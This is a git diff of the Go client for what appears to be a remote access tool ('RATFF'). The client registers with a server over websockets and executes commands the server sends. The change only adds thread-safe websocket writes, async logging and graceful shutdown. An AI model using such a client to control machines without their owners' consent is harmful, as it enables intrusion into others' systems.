@@ -1,6 +1,9 @@
 package main
 
 import (
+	"os"
+	"os/signal"
+	"syscall"
 	"time"
 
 	"RATFF/shared"
@@ -11,6 +14,9 @@ import (
 
 // log is the package-level logger instance.
 var log *logrus.Entry
+
+// asyncWriter holds the async writer for graceful shutdown.
+var asyncWriter *shared.AsyncWriter
 
 // reconnectAttempt tracks the number of consecutive reconnection attempts.
 var reconnectAttempt int
@@ -23,39 +29,44 @@ func runClient(serverURL, clientID string) error {
 	}
 	defer conn.Close()
 
-	shared.SetupHeartbeat(conn)
+	wsConn := shared.NewWSConn(conn)
+	shared.SetupSafeHeartbeat(wsConn)
 
 	info := shared.BuildClientInfo(clientID)
 	msg := shared.NewMessage(shared.MsgRegister, "", clientID, info.ToPayload())
-	if err := shared.SendWSMessage(conn, msg); err != nil {
+	if err := shared.SendSafeWSMessage(wsConn, msg); err != nil {
 		return err
 	}
 
 	log.WithField("client_id", clientID).Info("Connected to server")
 
 	reconnectAttempt = 0
-	return messageLoop(conn)
+	return messageLoop(wsConn)
 }
 
 // messageLoop continuously reads and processes messages from the server.
-func messageLoop(conn *websocket.Conn) error {
+func messageLoop(wsConn *shared.WSConn) error {
 	for {
 		var msg shared.Message
-		if err := shared.ReadWSMessage(conn, &msg); err != nil {
+		if err := shared.ReadWSMessage(wsConn.Conn, &msg); err != nil {
 			return err
 		}
 
 		resp := executeCommand(msg)
 
-		if err := shared.SendWSMessage(conn, resp); err != nil {
+		if err := shared.SendSafeWSMessage(wsConn, resp); err != nil {
 			return err
 		}
 	}
 }
 
 func main() {
-	log = shared.InitLogger("info", "text")
+	log, asyncWriter = shared.InitLoggerWithWriter("info", "text", true)
 	loadConfig()
+
+	// Setup signal handler for graceful shutdown
+	quit := make(chan os.Signal, 1)
+	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
 
 	serverURL := getServerURL()
 	clientID := cfg.ClientID
@@ -63,6 +74,16 @@ func main() {
 		clientID = shared.GenerateClientID()
 	}
 	cfg.ClientID = clientID
+
+	// Start shutdown listener
+	go func() {
+		<-quit
+		log.Info("Shutting down client...")
+		if asyncWriter != nil {
+			asyncWriter.Close()
+		}
+		os.Exit(0)
+	}()
 
 	for {
 		if err := runClient(serverURL, clientID); err != nil {
